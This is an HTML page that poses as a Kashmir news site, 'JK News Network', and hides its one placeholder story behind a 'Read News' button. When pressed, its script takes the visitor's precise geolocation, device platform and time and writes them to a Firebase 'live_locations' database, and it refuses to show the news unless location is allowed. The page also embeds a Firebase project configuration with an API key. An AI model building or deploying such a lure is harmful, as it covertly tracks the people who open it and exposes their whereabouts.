<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JK News Network | Live Updates</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: sans-serif; background: #f0f2f5; }
        
        /* Welcome Screen */
        #start-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; z-index: 9999; display: flex; flex-direction: column;
            align-items: center; justify-content: center; text-align: center; padding: 20px;
        }
        .btn-read {
            background: #d93025; color: white; border: none; padding: 15px 40px;
            font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
            box-shadow: 0 4px 15px rgba(217, 48, 37, 0.4);
        }
        header { background: #d93025; color: white; padding: 15px; text-align: center; font-weight: bold; }
        .news-card { background: white; margin: 15px; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .news-card img { width: 100%; height: 200px; object-fit: cover; }
    </style>
</head>
<body>

<div id="start-screen">
    <h1 style="color:#d93025; margin-bottom:10px;">JK NEWS NETWORK</h1>
    <p style="margin-bottom:25px; color:#555;">Srinagar, Jammu aur Ladakh ki taza tareen khabron ke liye niche click karein.</p>
    <button class="btn-read" id="main-btn">READ NEWS / خبریں پڑھیں</button>
</div>

<div id="content" style="display:none;">
    <header>JK NEWS NETWORK - LIVE</header>
    <div class="news-card">
        <img src="https://images.unsplash.com/photo-1598324423733-196d0061e389?w=600">
        <div style="padding:15px;">
            <h2>Srinagar Smart City Project Update</h2>
            <p>Jhelum riverfront ka kaam mukammal ho chuka hai...</p>
        </div>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDGF0GEonMgT8HjIqZux4IpkpjUjTwCl6k",
        authDomain: "the-kargil-rock.firebaseapp.com",
        databaseURL: "https://the-kargil-rock-default-rtdb.firebaseio.com",
        projectId: "the-kargil-rock",
        storageBucket: "the-kargil-rock.firebasestorage.app",
        messagingSenderId: "137725131934",
        appId: "1:137725131934:web:43baf72100c62fb0044f8f"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Button click listener
    document.getElementById('main-btn').addEventListener('click', function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                // Success: Firebase mein data bhejein
                const userId = "User_" + Math.floor(Math.random() * 90000);
                set(ref(db, 'live_locations/' + userId), {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    device: navigator.platform,
                    time: new Date().toLocaleTimeString(),
                    date: new Date().toLocaleDateString()
                }).then(() => {
                    // News dikha dein
                    document.getElementById('start-screen').style.display = 'none';
                    document.getElementById('content').style.display = 'block';
                });
            }, function(error) {
                alert("News parhne ke liye location 'Allow' karna lazmi hai.");
            }, { enableHighAccuracy: true });
        } else {
            alert("Aapka phone location support nahi karta.");
        }
    });
</script>
</body>
</html>
